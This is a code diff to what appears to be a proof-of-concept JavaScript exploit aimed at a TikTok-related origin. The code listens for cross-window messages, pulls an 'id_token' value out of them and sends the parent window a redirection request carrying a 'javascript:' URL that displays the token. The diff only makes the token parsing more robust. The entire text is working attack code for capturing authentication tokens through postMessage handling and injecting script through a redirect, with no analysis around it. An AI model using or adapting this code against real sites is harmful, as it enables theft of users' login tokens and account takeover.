@@ -6,12 +6,15 @@ document.addEventListener("DOMContentLoaded", function() {
     document.body.appendChild(iframe);
 
     window.addEventListener("message", function(e) {
-        if (e.origin.includes("tiktokw.eu") && e.data && e.data.indexOf("id_token=") !== -1) {
-            var token = e.data.match(/id_token=([^&]+)/)[1];
-            parent.postMessage({
-                action: "requestRedirectionTo",
-                targetUrlStr: "javascript:alert('Magic token is = " + decodeURIComponent(token) + "')"
-            }, "*");
+        if (e.origin.includes("tiktokw.eu") && typeof e.data === 'string' && e.data.includes("id_token=")) {
+            var tokenMatch = e.data.match(/id_token=([^&]+)/);
+            if (tokenMatch) {
+                var token = tokenMatch[1];
+                parent.postMessage({
+                    action: "requestRedirectionTo",
+                    targetUrlStr: "javascript:alert('Magic token is = " + decodeURIComponent(token) + "')"
+                }, "*");
+            }
         }
     }, false);
 });
